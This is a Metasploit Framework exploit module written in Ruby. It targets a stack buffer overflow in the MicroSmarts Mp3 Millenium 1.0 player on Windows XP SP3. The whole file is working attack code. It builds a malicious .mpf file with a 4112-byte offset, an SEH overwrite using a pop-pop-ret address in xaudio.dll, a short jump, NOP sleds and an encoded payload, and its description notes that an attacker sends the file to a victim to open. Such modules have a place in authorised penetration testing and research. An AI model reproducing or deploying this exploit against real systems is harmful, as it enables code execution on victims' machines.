##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MicroSmarts LLC Mp3 Millenium 1.0 (MPF File) Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Mp3 Millenium 1.0 mp3
				player. An attacker must send the file to victim and the victim must open the file.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [
					'Koshi', # Vulnerability Discovery
					'corelanc0d3r', # Exploit tutorial
					'Redsadic <julian.vilas[at]gmail.com>', # Metasploit module
			],
			'References'     =>
				[
					[ 'BID', '40576' ],
				],
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0a\x0d\x09\x1a",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# Tested by redsadic - 20130716 xpsp3
					[ 'Windows XP SP3 / MicroSmarts LLC Mp3 Millenium 1.0', { 'Ret' => 0x1002083D , 'Offset' => 4112 } ], # pop pop ret - xaudio.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 28 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'sploit.mpf']),
			], self.class)

	end

	def exploit

		total_length = 5000

		sploit = rand_text(target['Offset'])

		#nseh -> jmp 30 bytes (between 6 and 30 payload becomes corrupted)
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+" + (30).to_s).encode_string
		sploit << make_nops(2)

		sploit << [target.ret].pack('V') #seh

		sploit << make_nops(40) #nopsled to avoid payload corruption

		sploit << payload.encoded

		# Filling data to trigger seh
		sploit << rand_text(total_length - sploit.length)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end
